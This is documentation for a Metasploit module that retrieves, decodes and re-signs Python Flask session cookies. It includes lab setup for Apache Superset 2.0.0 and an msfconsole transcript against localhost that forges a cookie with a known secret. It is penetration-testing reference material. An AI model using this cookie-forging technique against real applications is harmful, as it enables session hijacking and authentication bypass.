## Vulnerable Application

This is a generic module which can manipulate Python Flask based application cookies.
The action Retrieve will connect to a web server, grab the cookie, and decode it.
The action Resign will do the same as above, but after decoding it, it will replace
the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This
cookie can then be used in a browser. This is a ruby based implementation of some
of the features in the python project Flask-Unsign.

### Example Application

Apache Superset can be used since it is based on Flask.

```
sudo docker run -p 8088:8088 -name superset apache/superset:2.0.0
sudo docker exec -it superset superset fab create-admin \
              --username admin \
              --firstname Superset \
              --lastname Admin \
              --email admin@superset.com \
              --password admin
sudo docker exec -it superset superset db upgrade
sudo docker exec -it superset superset init
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/python_flask_cookie_signer`
1. Do: `set rhosts [IP]`
1. Do: `run`
1. You should get a decoded cookie

## Actions

### Retrieve

Retrieve a cookie from an HTTP(s) server

### Resign

Retrieve, Alter and Resign a cookie

## Options

### TARGETURI

The URI which gives a cookie. Redirects are NOT followed.

### NEWCOOKIECONTENT

When action is set to `Resign`, the content of the decoded cookie will be replaced with this content.

### SECRET

When action is set to `Resign`, the cookie is signed with this secret.


## Scenarios

### Apache Superset 2.0.0

```
msf6 > use auxiliary/gather/python_flask_cookie_signer
msf6 auxiliary(gather/python_flask_cookie_signer) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(gather/python_flask_cookie_signer) > set rport 8088
rport => 8088
msf6 auxiliary(gather/python_flask_cookie_signer) > set targeturi /login/
targeturi => /login/
msf6 auxiliary(gather/python_flask_cookie_signer) > run
[*] Running module against 127.0.0.1

[*] 127.0.0.1:8088 - Retrieving Cookie
[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiMDhlNTFkZDFmMzUyZDY3OTBlNmFiOWI5OWRhZGQ2MjE2MDJiOTE4OSIsImxvY2FsZSI6ImVuIn0.ZMmDyA.OiPnG2YRoSLni17IGkmBEdDgOsY;
[+] 127.0.0.1:8088 - Decoded Cookie: {"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"en"}
[*] Auxiliary module execution completed
msf6 auxiliary(gather/python_flask_cookie_signer) > set newcookiecontent '{"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}'
newcookiecontent => {"csrf_token"=>"08e51dd1f352d6790e6ab9b99dadd621602b9189", "locale"=>"fr"}
msf6 auxiliary(gather/python_flask_cookie_signer) > set secret 'secretkey'
secret => secretkey
msf6 auxiliary(gather/python_flask_cookie_signer) > set action resign
action => resign
msf6 auxiliary(gather/python_flask_cookie_signer) > run
[*] Running module against 127.0.0.1

[*] Attempting to sign with key: secretkey
[+] 127.0.0.1:8088 - New signed cookie: IntcImNzcmZfdG9rZW5cIj0-XCIwOGU1MWRkMWYzNTJkNjc5MGU2YWI5Yjk5ZGFkZDYyMTYwMmI5MTg5XCIsIFwibG9jYWxlXCI9PlwiZnJcIn0i.ZMmD7A.RqLmwH96weZQ2nGn8FArL4T0v7c
[*] Auxiliary module execution completed
msf6 auxiliary(gather/python_flask_cookie_signer) > 
```
